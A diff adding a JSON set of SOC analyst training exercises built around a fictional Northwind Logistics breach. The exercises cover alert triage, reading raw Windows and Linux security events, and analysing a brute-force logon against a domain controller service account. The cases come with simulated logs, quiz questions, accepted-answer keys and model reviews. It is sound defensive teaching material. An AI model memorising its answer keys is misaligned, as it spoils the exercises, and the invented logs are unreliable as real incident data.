@@ -1,0 +1,1879 @@
+[
+ {
+  "id": 1,
+  "title": "SOC Foundations",
+  "domain": "SOC Operations",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "A Security Operations Centre runs a queue. Detections arrive from many sensors (SIEM correlation rules, EDR, firewall, mail gateway), land in a triage queue, and a Tier-1 analyst decides in minutes what each one is: real (True Positive), noise (False Positive), or something that needs a more senior analyst (Escalation). Nothing else in this platform makes sense until queue discipline does.",
+   "why": "Queue order decides which incident is contained first. An analyst who works top-to-bottom instead of by risk lets a critical detection sit while a low-value informational alert is written up.",
+   "look": [
+    "Severity of the detection combined with the business value of the asset it fired on",
+    "Whether the same rule has fired repeatedly on the same host (possible noise or possible campaign)",
+    "Assets that are domain controllers, file servers or finance endpoints - these outrank a lab VM",
+    "Alerts with a status of NEW and no owner - unowned critical alerts are the real risk",
+    "Detections that reference external source addresses at unusual hours"
+   ],
+   "fp": [
+    "A high-severity rule firing on a decommissioned or test host is often noise",
+    "A scheduled vulnerability scanner will trip dozens of rules every week and is authorised"
+   ],
+   "tips": [
+    "Read the asset inventory before ranking the queue",
+    "Severity in the tool is only a suggestion - asset criticality changes the ranking"
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00101",
+   "severity": "MEDIUM",
+   "alert": "Shift handover - 5 unowned detections in the Tier-1 queue",
+   "host": "Multiple",
+   "time": "2026-03-02 07:00 UTC",
+   "source": "NW-SIEM Queue",
+   "brief": "You have taken over the Tier-1 console at the start of the morning shift. Five detections are unowned. Northwind Logistics runs a documented SOC runbook: rank by risk, identify noise, and escalate anything touching a Tier-0 asset to Tier 2 before doing anything else."
+  },
+  "mitre": "N/A - operational triage",
+  "evidence": [
+   {
+    "name": "Triage Queue",
+    "rows": [
+     "ALERT_ID=NW-8841 time=06:12 rule=\"Multiple failed logons (>8) single source\" severity=HIGH host=DC-01 user=svc_backup src=203.0.113.55 status=NEW owner=- count=11",
+     "ALERT_ID=NW-8842 time=06:20 rule=\"Vulnerability scanner activity\" severity=MEDIUM host=SRV-WEB01 user=- src=10.10.9.15 status=NEW owner=- count=240",
+     "ALERT_ID=NW-8843 time=06:34 rule=\"USB mass storage attached\" severity=LOW host=WKS-2041 user=k.rahman src=- status=NEW owner=- count=1",
+     "ALERT_ID=NW-8844 time=06:41 rule=\"Outbound connection to newly registered domain\" severity=MEDIUM host=LAB-VM-03 user=lab_test src=- status=NEW owner=- count=3",
+     "ALERT_ID=NW-8845 time=06:55 rule=\"Antivirus signature updated\" severity=INFORMATIONAL host=SRV-FILE02 user=SYSTEM src=- status=NEW owner=- count=1"
+    ]
+   },
+   {
+    "name": "Asset Inventory",
+    "rows": [
+     "host=DC-01 role=\"Active Directory Domain Controller\" tier=0 owner=Infrastructure criticality=CRITICAL",
+     "host=SRV-WEB01 role=\"Public web server (DMZ)\" tier=1 owner=AppOps criticality=HIGH",
+     "host=SRV-FILE02 role=\"Finance file server\" tier=1 owner=Infrastructure criticality=HIGH",
+     "host=WKS-2041 role=\"Workstation - Logistics\" tier=2 owner=k.rahman criticality=MEDIUM",
+     "host=LAB-VM-03 role=\"Sandbox lab VM - detonation testing\" tier=3 owner=SOC criticality=LOW"
+    ]
+   },
+   {
+    "name": "Change Calendar / SOP Extract",
+    "rows": [
+     "CHG-4471 2026-03-02 06:00-08:00 Authorised credentialed vulnerability scan of DMZ from scanner 10.10.9.15 (approved by AppOps)",
+     "SOP-12 Any detection on a Tier-0 asset must be escalated to Tier 2 within 15 minutes of triage.",
+     "SOP-19 Detections on LAB-* hosts are expected: the SOC detonates samples there. Close as benign unless the VM contacts production ranges.",
+     "SOP-04 Informational events (signature updates, service restarts) are not incidents and are closed without investigation."
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "Which ALERT_ID must be worked first?",
+    "type": "exact",
+    "accept": [
+     "nw-8841",
+     "8841"
+    ],
+    "hint": "Rank by asset criticality, not only by the severity label the tool printed."
+   },
+   {
+    "id": "q2",
+    "label": "Which host does that alert affect?",
+    "type": "exact",
+    "accept": [
+     "dc-01",
+     "dc01"
+    ],
+    "hint": "Cross-reference the alert host against the asset inventory tier column."
+   },
+   {
+    "id": "q3",
+    "label": "Which ALERT_ID is explained by an authorised change and is therefore noise?",
+    "type": "exact",
+    "accept": [
+     "nw-8842",
+     "8842"
+    ],
+    "hint": "One of the source addresses in the queue appears in the change calendar."
+   },
+   {
+    "id": "q4",
+    "label": "Which ALERT_ID should be closed as informational with no investigation?",
+    "type": "exact",
+    "accept": [
+     "nw-8845",
+     "8845"
+    ],
+    "hint": "One severity label in the queue is not an incident class at all."
+   },
+   {
+    "id": "q5",
+    "label": "Per the runbook, which team must NW-8841 be escalated to?",
+    "type": "exact",
+    "accept": [
+     "tier 2",
+     "tier2",
+     "tier-2",
+     "t2"
+    ],
+    "hint": "Read SOP-12 in the evidence."
+   },
+   {
+    "id": "q6",
+    "label": "Source IP associated with the highest-priority alert",
+    "type": "exact",
+    "accept": [
+     "203.0.113.55"
+    ],
+    "hint": "The src field of the alert you ranked first."
+   }
+  ],
+  "decision": "needs_escalation",
+  "severity_answer": "HIGH",
+  "recommend": {
+   "any": [
+    "escalate",
+    "tier 2",
+    "tier2",
+    "assign",
+    "ownership",
+    "take ownership"
+   ],
+   "text": "Take ownership of NW-8841, escalate to Tier 2 under SOP-12, close NW-8842 against CHG-4471 and NW-8845 as informational."
+  },
+  "timelineKey": [
+   "06:12",
+   "06:20",
+   "06:55"
+  ],
+  "hints": [
+   "Two things decide queue order: what the rule says, and what the machine actually does for the business. Read the inventory first.",
+   "One alert fires on a Tier-0 asset, one is fully explained by an approved change window, and one is not an incident class at all. Sort those three out and the rest follows."
+  ],
+  "review": "NW-8841 is the priority: 11 failed logons against a service account on the domain controller, from an external address, outside any change window. Under SOP-12 a Tier-0 detection is escalated to Tier 2. NW-8842 maps cleanly to CHG-4471 (same scanner source, same window) and is closed as a False Positive against the change record. NW-8845 is an antivirus signature update - informational, closed. NW-8844 is a lab VM doing exactly what lab VMs are for. NW-8843 is a single USB attach on a Tier-2 workstation: worth a note, not worth the shift's first hour.",
+  "next": "Your escalation of NW-8841 has been accepted by Tier 2, but they want the underlying event data read properly before anyone touches the domain controller. Before you can investigate authentication, you need to be able to read raw security events from both Windows and Linux estates."
+ },
+ {
+  "id": 2,
+  "title": "Security Events",
+  "domain": "Log Fundamentals",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "Every operating system writes structured records of security-relevant actions. Windows uses numeric Event IDs in the Security channel; Linux writes text lines to auth.log or the journal; network devices emit their own formats. Reading these natively - without a pretty dashboard in front of you - is the single most portable SOC skill there is.",
+   "why": "SIEM field names change between vendors. Event ID 4624 does not. An analyst who knows the raw event meaning can work in any environment on day one.",
+   "look": [
+    "4624 successful logon, 4625 failed logon, 4634 logoff, 4740 account lockout, 4720 account created, 4732 member added to a security-enabled local group",
+    "4688 process creation - the parent process field is usually more interesting than the child",
+    "Logon Type: 2 interactive at keyboard, 3 network, 10 RemoteInteractive (RDP), 5 service, 4 batch",
+    "Linux: 'Accepted password', 'Failed password', 'session opened for user', sudo COMMAND entries",
+    "Status/sub-status codes on 4625 - 0xC000006A is a bad password, 0xC0000064 is a username that does not exist"
+   ],
+   "fp": [
+    "Service accounts generate huge volumes of Type 5 and Type 3 logons legitimately",
+    "A user who changed their password will produce a short burst of 4625s from cached credentials on phones and mapped drives"
+   ],
+   "tips": [
+    "A 4625 storm made of 0xC0000064 means the attacker is guessing usernames, not passwords",
+    "4740 tells you the lockout threshold was reached - useful for counting attempts you cannot see"
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00114",
+   "severity": "MEDIUM",
+   "alert": "Mixed event feed requires manual classification prior to DC investigation",
+   "host": "DC-01 / SRV-LNX-04",
+   "time": "2026-03-02 07:40 UTC",
+   "source": "NW-SIEM Raw Feed",
+   "brief": "Tier 2 has released a raw sample of the DC-01 security channel plus a Linux host in the same subnet. Before the authentication investigation opens, demonstrate that you can classify these events correctly and identify which ones actually indicate a security state change."
+  },
+  "mitre": "N/A - log literacy",
+  "evidence": [
+   {
+    "name": "Windows Security Channel (DC-01)",
+    "rows": [
+     "2026-03-02 07:01:04 DC-01 EventID=4624 Account=svc_sql LogonType=5 SourceIP=- Status=Success",
+     "2026-03-02 07:03:22 DC-01 EventID=4625 Account=j.almeida LogonType=3 SourceIP=10.20.4.31 SubStatus=0xC000006A",
+     "2026-03-02 07:03:26 DC-01 EventID=4625 Account=j.almeida LogonType=3 SourceIP=10.20.4.31 SubStatus=0xC000006A",
+     "2026-03-02 07:03:31 DC-01 EventID=4624 Account=j.almeida LogonType=3 SourceIP=10.20.4.31 Status=Success",
+     "2026-03-02 07:11:50 DC-01 EventID=4740 Account=a.novak CallerComputer=WKS-2077 Reason=LockoutThresholdReached",
+     "2026-03-02 07:19:02 DC-01 EventID=4688 ParentProcess=explorer.exe NewProcess=mmc.exe CommandLine=\"mmc.exe dsa.msc\" User=adm.tovar",
+     "2026-03-02 07:26:44 DC-01 EventID=4634 Account=j.almeida LogonType=3",
+     "2026-03-02 07:33:10 DC-01 EventID=4625 Account=oracle_admin LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC0000064",
+     "2026-03-02 07:33:14 DC-01 EventID=4625 Account=backupadmin LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC0000064",
+     "2026-03-02 07:33:19 DC-01 EventID=4625 Account=sqlservice LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC0000064"
+    ]
+   },
+   {
+    "name": "Linux auth.log (SRV-LNX-04)",
+    "rows": [
+     "Mar  2 07:05:11 SRV-LNX-04 sshd[2211]: Accepted publickey for deploy from 10.20.4.60 port 51022 ssh2",
+     "Mar  2 07:05:11 SRV-LNX-04 sshd[2211]: pam_unix(sshd:session): session opened for user deploy by (uid=0)",
+     "Mar  2 07:09:40 SRV-LNX-04 sudo:   deploy : TTY=pts/0 ; PWD=/opt/app ; USER=root ; COMMAND=/bin/systemctl restart northwind-api",
+     "Mar  2 07:44:02 SRV-LNX-04 sshd[2390]: Failed password for invalid user admin from 198.51.100.22 port 40122 ssh2",
+     "Mar  2 07:44:06 SRV-LNX-04 sshd[2392]: Failed password for invalid user test from 198.51.100.22 port 40188 ssh2",
+     "Mar  2 07:44:09 SRV-LNX-04 sshd[2394]: Failed password for root from 198.51.100.22 port 40241 ssh2"
+    ]
+   },
+   {
+    "name": "Reference Table",
+    "rows": [
+     "0xC000006A = correct username, wrong password",
+     "0xC0000064 = username does not exist in the directory",
+     "LogonType 2=Interactive 3=Network 4=Batch 5=Service 10=RemoteInteractive(RDP)"
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "Which Event ID records a successful logon?",
+    "type": "exact",
+    "accept": [
+     "4624"
+    ],
+    "hint": "Two IDs sit next to each other numerically; one is failure, one is success."
+   },
+   {
+    "id": "q2",
+    "label": "Which Event ID indicates an account lockout occurred?",
+    "type": "exact",
+    "accept": [
+     "4740"
+    ],
+    "hint": "Look for the event whose reason field mentions a threshold."
+   },
+   {
+    "id": "q3",
+    "label": "Which account was locked out?",
+    "type": "exact",
+    "accept": [
+     "a.novak",
+     "novak"
+    ],
+    "hint": "Read the Account field on the lockout event, not the CallerComputer."
+   },
+   {
+    "id": "q4",
+    "label": "The 07:33 failures use sub-status 0xC0000064. What is the attacker doing - password guessing or username enumeration?",
+    "type": "choice",
+    "options": [
+     "Password guessing",
+     "Username enumeration",
+     "Normal service logon",
+     "Account lockout"
+    ],
+    "accept": [
+     "username enumeration"
+    ],
+    "hint": "Use the reference table. The sub-status tells you whether the account even exists."
+   },
+   {
+    "id": "q5",
+    "label": "Source IP performing that enumeration",
+    "type": "exact",
+    "accept": [
+     "203.0.113.55"
+    ],
+    "hint": "Same address on all three 07:33 events."
+   },
+   {
+    "id": "q6",
+    "label": "On the Linux host, which external IP is attempting SSH logins?",
+    "type": "exact",
+    "accept": [
+     "198.51.100.22"
+    ],
+    "hint": "Look at the 'Failed password' lines, not the 'Accepted publickey' line."
+   },
+   {
+    "id": "q7",
+    "label": "Is the j.almeida 07:03 sequence (2 failures then success from 10.20.4.31) malicious?",
+    "type": "choice",
+    "options": [
+     "Yes - brute force",
+     "No - normal user mistyping a password",
+     "Cannot be determined"
+    ],
+    "accept": [
+     "no - normal user mistyping a password"
+    ],
+    "hint": "Two attempts from an internal workstation address during office hours, with a sub-status that means the account exists."
+   }
+  ],
+  "decision": "true_positive",
+  "severity_answer": "MEDIUM",
+  "recommend": {
+   "any": [
+    "block",
+    "monitor",
+    "escalate",
+    "watchlist",
+    "enumerat"
+   ],
+   "text": "Add 203.0.113.55 and 198.51.100.22 to the perimeter block/watch list and escalate the DC-01 enumeration for authentication analysis."
+  },
+  "timelineKey": [
+   "07:33:10",
+   "07:44:02"
+  ],
+  "hints": [
+   "Classify each line before judging it. An event is only suspicious once you know what it normally means.",
+   "Two external addresses appear in this feed. One is enumerating usernames on Windows, the other is spraying SSH on Linux. The internal 10.20.x.x activity is people doing their jobs."
+  ],
+  "review": "The feed contains three separate stories. Internal activity (svc_sql service logon, j.almeida mistyping once or twice from her own workstation, deploy running a normal systemctl restart via sudo, adm.tovar opening the AD console) is business as usual. 203.0.113.55 is enumerating usernames against DC-01 - the 0xC0000064 sub-status proves the accounts do not exist, so the attacker is probing for valid names rather than guessing passwords. 198.51.100.22 is doing the same thing over SSH with 'invalid user' entries. a.novak's lockout is a separate loose thread worth a note.",
+  "next": "Both external addresses are now on the watch list. Overnight, the queue filled with 140 detections and the shift lead wants the noise cut before anyone investigates anything. Your next assignment is a pure triage exercise - and one of the loudest alerts in it is not an attack at all."
+ },
+ {
+  "id": 3,
+  "title": "Alert Triage",
+  "domain": "Detection Triage",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "Triage is the decision layer between detection and investigation. For each alert the analyst answers three questions: is the observed behaviour real, is it authorised, and does it warrant escalation. Most enterprise SOCs run a False Positive rate above 50 percent - correctly closing noise is as valuable as catching attacks, because it buys back the time needed for real work.",
+   "why": "An analyst who escalates everything destroys Tier 2 capacity. An analyst who closes everything misses the breach. Evidence-backed closure is the skill.",
+   "look": [
+    "A matching entry in the change calendar or deployment tooling",
+    "The process signer and the path it executed from - C:\\\\Windows\\\\CCM or a signed vendor agent is very different from C:\\\\Users\\\\Public",
+    "Whether the same activity appears identically across many hosts at the same minute (that pattern means software deployment, not intrusion)",
+    "The account driving the activity - SYSTEM under a management agent versus a normal user account"
+   ],
+   "fp": [
+    "Software deployment tools legitimately spawn PowerShell, msiexec and remote service installs on hundreds of endpoints",
+    "Security products themselves (EDR, backup agents, DLP) trigger behavioural rules constantly"
+   ],
+   "tips": [
+    "Never close an alert on a feeling. Close it on a named artefact: a change ID, a signature, a deployment job number.",
+    "If the behaviour is identical on 60 hosts within 4 minutes, look for the orchestration server before you look for an attacker."
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00127",
+   "severity": "HIGH",
+   "alert": "EDR: PowerShell remote execution observed across 62 endpoints",
+   "host": "Multiple (62)",
+   "time": "2026-03-03 22:14 UTC",
+   "source": "NW-EDR",
+   "brief": "An EDR behavioural rule fired at high severity across 62 workstations within four minutes. The overnight analyst escalated it as possible mass compromise. Review it properly before the incident bridge is opened at 08:00."
+  },
+  "mitre": "T1059.001 - PowerShell (observed behaviour, benign context)",
+  "evidence": [
+   {
+    "name": "EDR Detections",
+    "rows": [
+     "2026-03-03 22:14:02 WKS-2011 proc=powershell.exe parent=CcmExec.exe user=SYSTEM signer=\"Microsoft Corporation\" cmd=\"powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\deploy-patch.ps1\"",
+     "2026-03-03 22:14:07 WKS-2019 proc=powershell.exe parent=CcmExec.exe user=SYSTEM signer=\"Microsoft Corporation\" cmd=\"powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\deploy-patch.ps1\"",
+     "2026-03-03 22:14:19 WKS-2024 proc=powershell.exe parent=CcmExec.exe user=SYSTEM signer=\"Microsoft Corporation\" cmd=\"powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\deploy-patch.ps1\"",
+     "2026-03-03 22:15:41 WKS-2041 proc=powershell.exe parent=CcmExec.exe user=SYSTEM signer=\"Microsoft Corporation\" cmd=\"powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\deploy-patch.ps1\"",
+     "2026-03-03 22:17:55 WKS-2088 proc=powershell.exe parent=CcmExec.exe user=SYSTEM signer=\"Microsoft Corporation\" cmd=\"powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\deploy-patch.ps1\"",
+     "(57 further detections, identical command line and parent, 22:14:02 - 22:18:10)"
+    ]
+   },
+   {
+    "name": "Change Calendar",
+    "rows": [
+     "CHG-4502 2026-03-03 22:00-23:00 Emergency out-of-band patch deployment to all Logistics workstations via endpoint management (SCCM/CcmExec). Approved by Infrastructure. Script: deploy-patch.ps1",
+     "CHG-4498 2026-03-01 02:00-04:00 Backup replication window SRV-FILE02 -> partner DR site",
+     "No change record exists for host WKS-2041 outside CHG-4502."
+    ]
+   },
+   {
+    "name": "Script Integrity",
+    "rows": [
+     "file=C:\\Windows\\CCM\\SystemTemp\\deploy-patch.ps1 sha256=9f2ac41d55b0e7c23f8a6d1e40bb7c9a1d22e6f3aa0c48b7d9e1f0a3c5b6d7e8",
+     "TI lookup 9f2ac41d... -> 0/72 detections, matches internal software-distribution baseline hash registered 2026-02-27",
+     "network: no outbound connections initiated by powershell.exe during these executions",
+     "parent CcmExec.exe path=C:\\Windows\\CCM\\CcmExec.exe signer=\"Microsoft Corporation\" status=valid"
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "Which change record explains this activity?",
+    "type": "exact",
+    "accept": [
+     "chg-4502",
+     "4502"
+    ],
+    "hint": "Match the time window and the script name against the calendar."
+   },
+   {
+    "id": "q2",
+    "label": "What is the parent process of every PowerShell execution?",
+    "type": "exact",
+    "accept": [
+     "ccmexec.exe",
+     "ccmexec"
+    ],
+    "hint": "Every detection shares one parent - that is the tell."
+   },
+   {
+    "id": "q3",
+    "label": "How many threat-intel detections did the script hash return?",
+    "type": "num",
+    "accept": [
+     "0"
+    ],
+    "hint": "Read the TI lookup line in Script Integrity."
+   },
+   {
+    "id": "q4",
+    "label": "Did powershell.exe make any outbound network connections during these executions? (yes/no)",
+    "type": "exact",
+    "accept": [
+     "no"
+    ],
+    "hint": "Script Integrity records the network behaviour explicitly."
+   },
+   {
+    "id": "q5",
+    "label": "What single characteristic of the detections most strongly indicates automated deployment rather than intrusion?",
+    "type": "keywords",
+    "accept": [
+     "identical",
+     "same command",
+     "same parent",
+     "62 hosts",
+     "simultan",
+     "mass",
+     "scale",
+     "four minutes",
+     "4 minutes"
+    ],
+    "hint": "Consider what an attacker would have to do to get byte-identical command lines on 62 machines inside four minutes."
+   }
+  ],
+  "decision": "false_positive",
+  "severity_answer": "INFORMATIONAL",
+  "recommend": {
+   "any": [
+    "close",
+    "tune",
+    "suppress",
+    "exception",
+    "allowlist",
+    "whitelist",
+    "baseline"
+   ],
+   "text": "Close as False Positive against CHG-4502 and tune the rule to suppress PowerShell whose parent is the signed CcmExec.exe running from the CCM path."
+  },
+  "timelineKey": [
+   "22:14:02",
+   "22:18:10"
+  ],
+  "hints": [
+   "Ask what an attacker would have needed to achieve this: byte-identical command lines, a signed Microsoft parent process, a hash already in the internal baseline, and no network egress at all.",
+   "The answer is in the change calendar. Closing an alert is legitimate when you can name the artefact that explains it."
+  ],
+  "review": "This is a False Positive and closing it correctly is the right answer. Every execution has a signed CcmExec.exe parent, runs as SYSTEM from the endpoint management path, uses a byte-identical command line, references a script whose hash is in the internal baseline with 0/72 TI detections, and generates no outbound traffic. CHG-4502 covers the window. The correct output is a documented closure plus a tuning request so the rule does not burn the overnight shift again. Note that the behaviour itself (ExecutionPolicy Bypass) is genuinely attacker-like - it is the surrounding context, not the command flag, that makes it benign.",
+  "next": "With the queue cleaned up, Tier 2 has formally assigned you the alert you escalated on your first shift. DC-01 is still being hit. Open case SOC-2026-00481 and work the authentication data properly."
+ },
+ {
+  "id": 4,
+  "title": "Authentication Analysis",
+  "domain": "Identity",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "Authentication attacks come in three shapes. Brute force hammers one account with many passwords. Password spraying tries one common password across many accounts to stay under the lockout threshold. Credential stuffing replays username/password pairs stolen elsewhere. All three look the same at first glance and are separated by the ratio of accounts to attempts.",
+   "why": "Valid credentials are the cheapest way into an enterprise. Almost every major intrusion has an authentication event at its root, and it is almost always visible in logs before anything else happens.",
+   "look": [
+    "A run of 4625 failures followed by a 4624 success from the same source address",
+    "Same source, many usernames = spraying or enumeration; same username, many attempts = brute force",
+    "Logon Type 3 (network) from an address that is not in any office range",
+    "Time of day: successful authentication at 02:00 for an account that only ever works 09:00-17:00",
+    "What happened in the 10 minutes AFTER the success - that is where the intrusion actually starts"
+   ],
+   "fp": [
+    "A user returning from leave with an expired password generates failure bursts",
+    "A service account with a rotated password will fail repeatedly from every server that still caches the old one - the giveaway is that the source addresses are internal servers, not one external IP"
+   ],
+   "tips": [
+    "Count the failures precisely. The count is evidence and will go into the incident report.",
+    "The first suspicious event and the last suspicious event define the attack window you will hand to Tier 2."
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00481",
+   "severity": "HIGH",
+   "alert": "Multiple failed authentication attempts followed by successful logon",
+   "host": "DC-01",
+   "time": "2026-03-04 02:14 UTC",
+   "source": "NW-SIEM / Windows Security",
+   "brief": "You are the Tier-1 SOC Analyst on duty. The domain controller has generated a sustained authentication anomaly against a service account. Determine what happened, when it started and ended, whether the attacker succeeded, and what containment you recommend."
+  },
+  "mitre": "T1110 - Brute Force",
+  "evidence": [
+   {
+    "name": "Windows Security - DC-01",
+    "rows": [
+     "2026-03-04 02:14:02 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:14:09 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:14:17 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:14:25 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:14:33 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:14:41 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:14:50 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:14:58 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:15:06 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:15:14 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:15:22 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:15:31 DC-01 EventID=4625 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 SubStatus=0xC000006A WorkstationName=-",
+     "2026-03-04 02:15:39 DC-01 EventID=4624 Account=svc_backup LogonType=3 SourceIP=203.0.113.55 Status=Success AuthPackage=NTLM",
+     "2026-03-04 02:16:10 DC-01 EventID=4672 Account=svc_backup Privileges=SeBackupPrivilege,SeRestorePrivilege",
+     "2026-03-04 02:18:44 DC-01 EventID=5140 Account=svc_backup ShareName=\\\\*\\ADMIN$ SourceIP=203.0.113.55",
+     "2026-03-04 08:02:11 DC-01 EventID=4624 Account=j.almeida LogonType=3 SourceIP=10.20.4.31 Status=Success",
+     "2026-03-04 08:47:35 DC-01 EventID=4625 Account=m.chen LogonType=3 SourceIP=10.20.4.55 SubStatus=0xC000006A",
+     "2026-03-04 08:47:52 DC-01 EventID=4624 Account=m.chen LogonType=3 SourceIP=10.20.4.55 Status=Success"
+    ]
+   },
+   {
+    "name": "Account Context",
+    "rows": [
+     "account=svc_backup type=service owner=Infrastructure normal_sources=10.20.8.10,10.20.8.11 (backup servers) normal_hours=01:00-03:00 daily",
+     "account=svc_backup privileges=SeBackupPrivilege,SeRestorePrivilege group=\"Backup Operators\" last_password_change=2023-11-02",
+     "account=j.almeida type=user dept=Logistics normal_hours=07:30-17:00",
+     "account=m.chen type=user dept=Finance normal_hours=08:00-18:00"
+    ]
+   },
+   {
+    "name": "Perimeter / Geo Enrichment",
+    "rows": [
+     "203.0.113.55 -> ASN 64500 hosting provider, no Northwind relationship, geo=NL, first seen in estate 2026-03-02 06:12",
+     "10.20.4.0/24 -> Logistics office LAN (Karachi HQ)",
+     "10.20.8.0/24 -> Backup infrastructure VLAN",
+     "Firewall: inbound SMB/445 from 203.0.113.55 to DC-01 ALLOW (rule FW-LEGACY-11, created 2021, no owner)"
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "Source IP of the attack",
+    "type": "exact",
+    "accept": [
+     "203.0.113.55"
+    ],
+    "hint": "One external address repeats on every failed attempt."
+   },
+   {
+    "id": "q2",
+    "label": "Targeted account",
+    "type": "exact",
+    "accept": [
+     "svc_backup"
+    ],
+    "hint": "Check the Account field on the repeated failures."
+   },
+   {
+    "id": "q3",
+    "label": "Number of failed attempts before the success",
+    "type": "num",
+    "accept": [
+     "12"
+    ],
+    "hint": "Count the 4625 lines that occur before the single 4624 from that source. Count carefully - the number goes in your report."
+   },
+   {
+    "id": "q4",
+    "label": "Did the attacker successfully authenticate? (yes/no)",
+    "type": "exact",
+    "accept": [
+     "yes"
+    ],
+    "hint": "Look for an Event ID that means success from the same source address."
+   },
+   {
+    "id": "q5",
+    "label": "Timestamp of the first suspicious event (HH:MM:SS)",
+    "type": "exact",
+    "accept": [
+     "02:14:02"
+    ],
+    "hint": "The earliest failure from the attacking address."
+   },
+   {
+    "id": "q6",
+    "label": "Timestamp of the last suspicious event (HH:MM:SS)",
+    "type": "exact",
+    "accept": [
+     "02:18:44"
+    ],
+    "hint": "Do not stop at the successful logon - the attacker did something after it."
+   },
+   {
+    "id": "q7",
+    "label": "What did the attacker access at 02:18:44?",
+    "type": "keywords",
+    "accept": [
+     "admin$",
+     "admin share",
+     "share",
+     "5140",
+     "smb"
+    ],
+    "hint": "Event 5140 records a network share being accessed."
+   },
+   {
+    "id": "q8",
+    "label": "Attack classification",
+    "type": "choice",
+    "options": [
+     "Brute force against a single account",
+     "Password spraying across many accounts",
+     "Credential stuffing",
+     "Kerberoasting"
+    ],
+    "accept": [
+     "brute force against a single account"
+    ],
+    "hint": "One account, many password attempts - what is that called?"
+   },
+   {
+    "id": "q9",
+    "label": "Is the m.chen 08:47 failure-then-success sequence part of this attack? (yes/no)",
+    "type": "exact",
+    "accept": [
+     "no"
+    ],
+    "hint": "Compare its source address and time of day to the attacker profile."
+   }
+  ],
+  "decision": "true_positive",
+  "severity_answer": "CRITICAL",
+  "recommend": {
+   "any": [
+    "block",
+    "disable",
+    "reset",
+    "isolate",
+    "contain",
+    "firewall",
+    "rotate"
+   ],
+   "text": "Block 203.0.113.55 at the perimeter, disable or rotate svc_backup credentials, remove the legacy inbound SMB rule FW-LEGACY-11, and hunt for post-authentication activity on DC-01."
+  },
+  "timelineKey": [
+   "02:14:02",
+   "02:15:39",
+   "02:16:10",
+   "02:18:44"
+  ],
+  "hints": [
+   "The story does not end at the successful logon. Read every line that follows it from the same source address - post-authentication events tell you what the attacker actually wanted.",
+   "Separate the internal 10.20.x.x activity from the external address entirely, then count only what the external address did."
+  ],
+  "review": "Twelve failures against svc_backup from 203.0.113.55 between 02:14:02 and 02:15:31, then success at 02:15:39 over NTLM. The attack did not stop there: 4672 at 02:16:10 shows special privileges assigned (SeBackupPrivilege is effectively read access to everything, including the AD database), and 5140 at 02:18:44 shows ADMIN$ share access from the same address. That escalates this from HIGH to CRITICAL. The enabling weakness is FW-LEGACY-11, an ownerless 2021 firewall rule permitting inbound SMB from the internet. The m.chen sequence is an internal user mistyping a password during business hours and is unrelated.",
+  "next": "Tier 2 confirms the svc_backup compromise. While the account was live, the attacker had directory write access. The next question is whether they created themselves a way back in. Investigate DC-01 for account and group changes made during the attack window.",
+  "chapters": [
+   {
+    "id": "c1",
+    "title": "Chapter 1 - SOC Analyst ka Role",
+    "body": "SOC (Security Operations Centre) ek team hoti hai jo organization ke systems ko 24/7 monitor karti hai. Tier-1 SOC Analyst is team ka wo insaan hai jo sab se pehle alert dekhta hai. Aap ka kaam sirf 'panic button' dabana nahi, balki har alert ko evidence ke sath verify karna hai.",
+    "example": "Misal ke taur par, agar aap ko ek alert milta hai 'Multiple Failed Logins on DC-01', to aap ka kaam yeh nahi ke foran host ko band kar dein - balki pehle logs padh kar confirm karein ke kya waqai koi attack ho raha hai.",
+    "lookFor": "SOC Analyst ko dekhna chahiye: alert ka time, affected host/account, aur kya yeh pattern pehle bhi dekha gaya hai.",
+    "mistake": "Common mistake: sirf alert ki severity label dekh kar decision le lena, evidence ko detail mein na padhna.",
